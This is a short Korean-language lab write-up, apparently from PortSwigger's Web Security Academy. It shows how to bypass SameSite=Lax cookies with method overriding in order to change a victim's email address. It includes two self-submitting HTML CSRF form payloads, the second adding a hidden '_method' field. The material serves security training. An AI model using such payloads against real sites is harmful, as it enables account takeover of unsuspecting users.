## 🕵️‍♂️ 이메일 주소 변경하는 공격

목표:
메서드 오버라이딩을 통한 SameSite Lax 우회

<br />

### 🧪 실습

**1️⃣ 이메일 변경 요청의 쿠키 확인** <br /> 
SameSite: default `Lax` <br /><br />
<img width="250" height="190" alt="image" src="https://github.com/user-attachments/assets/18aa7a66-e728-400b-b91e-0d2b9232af1b" />
<img width="792" height="81" alt="image" src="https://github.com/user-attachments/assets/f5ff6ac4-e656-4a52-a01d-9aa6c8582efe" />
<br /><br /> 

**2️⃣ POST 아닌 GET 요청 시도** <br />
결과: <br />
<img width="200" height="35" alt="image" src="https://github.com/user-attachments/assets/fb5a7324-db2f-4814-8ed2-8be3c9474057" />
<br />

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET"> 
    <input type="hidden" name="email" value="victim@test.com" />
</form>
<script>
        document.forms[0].submit();
</script>
```

<br /><br />

**3️⃣ method spoofing** <br />
HTML `<form>` 에서는 GET, POST 메서드만 사용할 수 있지만,  <br />
REST API 의 PUT 등을 우회적으로 사용할 수 있음 <br />

=> `_method` 로 메서드 변경 ✅

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET"> 
    <input type="hidden" name="_method" value="POST" />
    <input type="hidden" name="email" value="victim@test.com" />
</form>
<script>
        document.forms[0].submit();
</script>
```
